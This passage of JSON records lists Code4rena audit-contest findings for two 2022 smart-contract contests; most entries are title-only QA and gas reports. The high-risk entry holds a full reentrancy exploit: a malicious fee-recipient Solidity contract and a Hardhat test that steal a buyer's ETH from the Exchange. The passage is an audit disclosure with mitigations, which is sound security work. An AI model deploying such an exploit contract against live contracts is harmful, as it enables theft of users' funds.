"2022-11-size-findings", "body": "Incompatibility with fee-on-transfer/inflationary/deflationary/rebasing tokens, on both base tokens and quote tokens, with varying impacts"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/27", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-02"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-03"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/5", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "edited-by-warden", "Q-01"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/4", "labels": ["bug", "G (Gas Optimization)", "grade-a", "edited-by-warden", "G-02"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-01"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/1", "labels": [], "target": "2022-11-size-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/261", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "Q-21"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/242", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-20"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/228", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-29"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/223", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-28"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/221", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-19"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/220", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-27"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/219", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-18"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/218", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-26"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/217", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-25"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/209", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-17"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/208", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-24"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/203", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-23"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/199", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-22"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/196", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-16"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Pool designed to be upgradeable but does not set owner, making it unupgradeable", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Pool.sol#L13   # Vulnerability details  ## Description  The docs state: \"*The pool allows user to predeposit ETH so that it can be used when a seller takes their bid. It uses an ERC1967 proxy pattern and only the exchange contract is permitted to make transfers.*\"  Pool is designed as an ERC1967 upgradeable proxy which handles balances of users in Not Fungible. Users may interact via deposit and withdraw with the pool, and use the funds in it to pay for orders in the Exchange.  Pool is declared like so: ``` contract Pool is IPool, OwnableUpgradeable, UUPSUpgradeable {  function _authorizeUpgrade(address) internal override onlyOwner {}  ... ```  Importantly, it has no constructor and no initializers. The issue is that when using upgradeable contracts, it is important to implement an initializer which will call the base contract's initializers in turn. See how this is done correctly in Exchange.sol:  ``` /* Constructor (for ERC1967) */ function initialize(     IExecutionDelegate _executionDelegate,     IPolicyManager _policyManager,     address _oracle,     uint _blockRange ) external initializer {     __Ownable_init();     isOpen = 1;    ... } ```  Since Pool skips the \\_\\_Ownable_init initialization call, this logic is skipped: ``` function __Ownable_init() internal onlyInitializing {     __Ownable_init_unchained(); } function __Ownable_init_unchained() internal onlyInitializing {     _transferOwnership(_msgSender()); } ```  Therefore, the contract owner stays zero initialized, and this means any use of onlyOwner will always revert.  The only use of onlyOwner in Pool is here: ``` function _authorizeUpgrade(address) internal override onlyOwner {} ```  The impact is that when the upgrade mechanism will check caller is authorized, it will revert. Therefore, the contract is unexpectedly unupgradeable. Whenever the EXCHANGE or SWAP address, or some functionality needs to be changed, it would not be possible.  ## Impact  The Pool contract is designed to be upgradeable but is actually not upgradeable  ## Proof of Concept  In the 'pool' test in execution.test.ts, add the following lines: ``` it('owner configured correctly', async () => {   expect(await pool.owner()).to.be.equal(admin.address); }); ```  It shows that the pool after deployment has owner as 0x0000...00  ## Tools Used  Manual audit, hardhat  ## Recommended Mitigation Steps  Implement an initializer for Pool similarly to the Exchange.sol contract."}, {"title": "All orders which use expirationTime == 0 to support oracle cancellation are not executable.", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/181", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor acknowledged", "M-03"], "target": "2022-11-non-fungible-findings", "body": "All orders which use expirationTime == 0 to support oracle cancellation are not executable."}, {"title": "Hacked owner or malicious owner can immediately steal all assets on the platform", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor acknowledged", "M-02"], "target": "2022-11-non-fungible-findings", "body": "Hacked owner or malicious owner can immediately steal all assets on the platform"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/168", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-15"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/164", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-14"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/163", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "Q-13"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/161", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-12"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-21"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-20"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/142", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-11"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/134", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-10"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-19"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-18"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/125", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-17"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-16"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/120", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-09"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-15"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-14"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-13"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Direct theft of buyers ETH funds.", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154   # Vulnerability details  ## Impact  Most severe issue:  **A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).**  Additional impacts that can be caused by these bugs: 1. Seller or Fee recipient can cause next in line executions to revert in `bulkExecute` (by altering `isInternal`, insufficient funds, etc..) 2. Seller or Fee recipient can call `_execute` externally  3. Seller or Fee recipient can set a caller `_remainingETH` to 0 (will not get refunded)  ## Proof of Concept Background: * The protocol added a `bulkExecute` function that allows multiple orders to execute. The implementation is implemented in a way that if an `_execute` of a single order reverts, it will not break additional or previous successful `_execute`s. It is therefore very important to track actual ETH used by the function.  * The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the `_returnDust` function and `setupExecution` modifier. This ensures that calls to `_execute` must be internal and have proper accounting of remainingETH.  * Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.  The new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.  There are three main bugs that can be exploited to steal the ETH: 1. Reentrancy is possible by feeRecipient as long as `_execute` is not called (`_execute` has a reentrancyGuard) 2. `bulkExecute` can be called with an empty parameter. This allows the caller to not enter `_execute` and call `_returnDust` 3. `_returnDust` sends the entire balance of the contract to the caller.  (Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)  There are two logical scenarios where the heist could originate from: 1. Malicious seller: The seller can set the fee recipient to a malicious contract. 2. Malicious fee recipient: fee recipient can steal the funds without the help of the seller.   Consider the scenario (#1) where feeRecipient rate 10% of token price 1 ETH: 1. Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice's (seller) sell order (lets assume first in line). 2. Bob calls `bulkExecute` with `4 ETH`. `1 ETH` for every order.  3. Alice's sell order gets executed. Fee  `0.1 ETH` is sent to feeRecipient (controlled by Alice). 4. feeRecipient *reenters* `bulkExecute` with *empty* array as parameter and `1 WEI` of data 5. `_returnDust` returns the balance of the contract to feeRecipient `3.9 ETH`. 6. feeRecipient sends `3.1 ETH` to seller (or any other beneficiary) 7. feeRecipient call `selfdestruct` opcode that transfers `0.9 ETH` to Exchange contract. This is in order to keep `_execute` from reverting when paying the seller. 8. `_execute` pays seller  `0.9 ETH`  9. Sellers balance is `4 ETH`.  10. The rest of the `_execute` calls by `bulkExecute` will get reverted because buyer cannot pay as his funds were stolen. 11. Buyers `3 ETH` funds stolen  ``` \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502 \u2502   Buyer   \u2502            \u2502 Exchange \u2502         \u2502 Fee Recipient \u2502    \u2502  Seller   \u2502 \u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518       \u2502                       \u2502                       \u2502                  \u2502       \u2502 bulkExecute(4 orders) \u2502                       \u2502                  \u2502       \u2502         4 ETH         \u2502                       \u2502                  \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                       \u2502                  \u2502       \u2502                       \u2502_execute sends 0.1 ETH \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502 bulkExecute(0 orders) \u2502                  \u2502       \u2502                       \u2502         1 WEI         \u2502                  \u2502       \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502    _retrunDust sends  \u2502                  \u2502       \u2502                       \u2502         3.9 ETH       \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502  Send 3.1 ETH    \u2502       \u2502                       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502       \u2502                       \u2502 Self destruct send    \u2502                  \u2502       \u2502                       \u2502         0.9 ETH       \u2502                  \u2502       \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502_execute sends 0.9 ETH \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 _execute revert\u2502                  \u2502       \u2502                       \u2502      \u2502     3 times    \u2502                  \u2502   \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510                   \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518                \u2502              \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510   \u25023 ETH  \u2502                   \u2502                       \u2502              \u25024 ETH  \u2502   \u2502Stolen \u2502                                                          \u2502Balance\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 ```  Here is a possible implementation of the fee recipient contract: ``` contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;      constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);              // Now we received All of buyers funds.              // Send stolen ETH to seller minus the amount needed in order to keep execution.             address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');              // selfdestruct and send funds needed to Exchange (to not revert)             selfdestruct(payable(msg.sender));         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } } ```  Important to know: the exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:  ``` pragma solidity 0.8.17;  import { Exchange } from \"../Exchange.sol\"; import { Execution } from \"../lib/OrderStructs.sol\";  contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;          constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } } ```  In the POC we talk mostly about `bulkExecute` but `execute` of a single execution can steal the buyers excessive ETH. ### Technical walkthrough of scenario  Buyers can call `execute` or `bulkExecute` to start an execution of orders.   Both functions have a `setupExecution` modifier that stores the amount of ETH the caller has sent for the transactions:  `bulkExecute` in `Exchange.sol`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 ```     function bulkExecute(Execution[] calldata executions)         external         payable         whenOpen         setupExecution     { ```  `setupExecution`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40 ```     modifier setupExecution() {         remainingETH = msg.value;         isInternal = true;         _;         remainingETH = 0;         isInternal = false;     } ```  `_execute` will be called to handle the buy and sell order. * The function has a reentracnyGuard.  * The function will check that the orders are signed correctly and that both orders match. * If everything is OK, `_executeFundsTransfer` will be called to transfer the buyers funds to the seller and fee recipient  `_executeFundsTransfer`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565 ```     function _executeFundsTransfer(         address seller,         address buyer,         address paymentToken,         Fee[] calldata fees,         uint256 price     ) internal {         if (msg.sender == buyer && paymentToken == address(0)) {             require(remainingETH >= price);             remainingETH -= price;         }          /* Take fee. */         uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);          /* Transfer remainder to seller. */         _transferTo(paymentToken, buyer, seller, receiveAmount);     } ```  Fees are calculated based on the rate set by the seller and send to the fee recipient in `_transferFees`.   When the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract.  This can be done through `bulkExecution`.  `bulkExecution` can be called with an empty array. If so, no `_execute` function will be called and therefore no reentrancyGuard will trigger. At the end of `bulkExecution`, `_returnDust` function is called to return excessive funds.  `bulkExecute`:  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 ```     function bulkExecute(Execution[] calldata executions)         external         payable         whenOpen         setupExecution     {         /*         REFERENCE         uint256 executionsLength = executions.length;         for (uint8 i=0; i < executionsLength; i++) {             bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);             (bool success,) = address(this).delegatecall(data);         }         _returnDust(remainingETH);         */         uint256 executionsLength = executions.length;         for (uint8 i = 0; i < executionsLength; i++) { ```  `_returnDust`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212 ```     function _returnDust() private {         uint256 _remainingETH = remainingETH;         assembly {             if gt(_remainingETH, 0) {                 let callStatus := call(                     gas(),                     caller(),                     selfbalance(),                     0,                     0,                     0,                     0                 )             }         }     } ```  After the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the `_executeFundsTransfer` to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the `selfdestruct` opcode  After that, the `_execute` function will continue and exit normally. `bulkExecute` will continue to the next order and call `_execute` which will revert.  Because `bulkExecute` delegatecalls `_execute` and continues even after revert, the function `bulkExecute` will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.  ### Hardhat POC:  add the following test to `execution.test.ts`: ``` describe.only('hack', async () => {       let executions: any[];       let value: BigNumber;       beforeEach(async () => {         await updateBalances();         const _executions = [];         value = BigNumber.from(0);         // deploy MockFeeReceipient         let contractFactory = await (hre as any).ethers.getContractFactory(           \"MockFeeReceipient\",           {},         );         let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);         await contractMockFeeReceipient.deployed();         //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut         tokenId += 1;         await mockERC721.mint(alice.address, tokenId);         sell = generateOrder(alice, {           side: Side.Sell,           tokenId,           paymentToken: ZERO_ADDRESS,           fees: [              {               rate: 1000,               recipient: contractMockFeeReceipient.address,             }           ],         });         buy = generateOrder(bob, {            side: Side.Buy,           tokenId,           paymentToken: ZERO_ADDRESS});         _executions.push({             sell: await sell.packNoOracleSig(),             buy: await buy.packNoSigs(),         });         // create 3 more executions         tokenId += 1;         for (let i = tokenId; i < tokenId + 3; i++) {           await mockERC721.mint(thirdParty.address, i);           const _sell = generateOrder(thirdParty, {             side: Side.Sell,             tokenId: i,             paymentToken: ZERO_ADDRESS,           });           const _buy = generateOrder(bob, {             side: Side.Buy,             tokenId: i,             paymentToken: ZERO_ADDRESS,           });           _executions.push({             sell: await _sell.packNoOracleSig(),             buy: await _buy.packNoSigs(),           });         }         executions = _executions;       });       it(\"steal funds\", async () => {         let aliceBalanceBefore = await alice.getBalance();         //price = 4 ETH         value = price.mul(4);         //call bulkExecute         tx = await waitForTx(           exchange.connect(bob).bulkExecute(executions, { value  }));         let aliceBalanceAfter = await alice.getBalance();         let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);         //check that alice received all 4 ETH         expect(aliceEarned).to.equal(value);       });     }); ```  Add the following contract to mocks folder: `MockFeeRecipient.sol`: ``` pragma solidity 0.8.17;  import { Exchange } from \"../Exchange.sol\"; import { Execution } from \"../lib/OrderStructs.sol\";  contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;      constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);              // Now we received All of buyers funds.              // Send stolen ETH to seller minus the amount needed in order to keep execution.             address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');              // selfdestruct and send funds needed to Exchange (to not revert)             selfdestruct(payable(msg.sender));         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } }  ```  Execute `yarn test` to see that test pass (Alice stole all 4 ETH)  ## Tools Used VS code, hardhat  ## Recommended Mitigation Steps 1. Put a reentrancyGuard on `execute` and `bulkExecute` functions 2. `_refundDust` return only _remainingETH 3. revert in `bulkExecute` if parameter array is empty. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/93", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-08"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/92", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-12"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Yul `call` return value not checked", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212-L227   # Vulnerability details  ### Author: rotcivegaf  ### Impact  The Yul `call` return value on function `_returnDust` is not checked, which could leads to the `sender` lose funds  ### Proof of Concept  The caller of the functions `bulkExecute` and `execute` could be a contract who may not implement the `fallback` or `receive` functions or reject the `call`, when a call to it with value sent in the function `_returnDust`, it will revert, thus it would fail to receive the `dust` ether  Proof:   - A contract use `bulkExecute`  - One of the executions fails  - The `Exchange` contract send the `dust`(Exchange balance) back to the contract   - This one for any reason reject the call  - The `dust` stay in the `Exchange` contract  - In the next call of `bulkExecute` or `execute` the balance of the `Exchange` contract(including the old `dust`) will send to the new caller  - The second sender will get the funds of the first contract  ### Tools Used  Review  ### Recommended Mitigation Steps  ```diff +    error ReturnDustFail(); +      function _returnDust() private {          uint256 _remainingETH = remainingETH; +        bool success;          assembly {              if gt(_remainingETH, 0) { -                let callStatus := call( +                success := call(                      gas(),                      caller(),                      selfbalance(),                      0,                      0,                      0,                      0                  )              }          } +        if (!success) revert ReturnDustFail();      } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-11"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-10"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/78", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-07"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-09"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/76", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-06"], "target": "2022-11-non-fungible-findings", "body": 